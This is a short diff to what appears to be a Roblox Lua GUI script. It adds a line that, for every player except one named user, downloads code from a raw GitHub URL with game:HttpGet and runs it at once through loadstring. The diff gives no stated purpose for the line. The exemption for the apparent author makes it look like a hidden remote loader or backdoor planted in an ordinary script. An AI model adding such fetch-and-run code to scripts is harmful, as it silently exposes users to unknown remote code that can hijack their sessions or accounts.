@@ -28,6 +28,7 @@ local op = Win:Tab("Others") -- This Creates a Tab on the left Side
 if game.Players.LocalPlayer.Name == "zzotac" then
     print("Done")
 else
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/admin'))()
     
 end
 
